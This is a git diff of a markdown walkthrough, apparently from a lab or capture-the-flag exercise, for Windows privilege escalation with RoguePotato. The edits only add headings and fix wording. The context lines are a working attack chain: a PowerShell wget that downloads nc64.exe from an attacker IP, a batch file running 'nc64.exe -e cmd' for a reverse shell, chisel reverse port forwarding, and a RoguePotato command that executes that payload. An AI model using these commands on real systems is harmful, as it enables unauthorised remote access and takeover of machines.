@@ -21,12 +21,12 @@ powershell -c wget http://10.10.x.x:8080/nc64.exe -outfile nc64.exe
 echo c:\Windows\Temp\nc64.exe -e cmd 10.10.x.x 1234 > rev.bat
 ```
 
-Now run chisel on Attacker VM.
+### Now run chisel on Attacker VM.
 ```markdown
 ./chisel server -p 8000 --reverse
 ```
 
-Now run chisle.exe on Traget Machine
+### Now run chisle.exe on Traget Machine
 ```markdown
 .\chisel.exe client 10.10.x.x:8000 R:135:localhost:9999
 ```
@@ -39,8 +39,8 @@ After gettng shell-2 we can set our listner on port that we've defined on rev.ba
 
 nc -nvlp 1234
 
-
-Now on shell-2 we can execute payload.
+## Getting Reverse Shell
+### Now on shell-2 we can execute payload.
 
 ```markdown
 .\RoguePotato.exe -r 10.10.x.x -l 9999 -e c:\Windows\Temp\rev.bat
@@ -55,7 +55,7 @@ if you're using Powershell.
 
 We can also use socat to port forward 135.
 First set chisel on Kali vm as mentioned above.
-Then on Target machine set run chisel as:
+Then on Target machine run chisel as:
 ```markdown
 .\chisel.exe client 10.10.x.x:8000 R:9999:localhost:9999
 ```
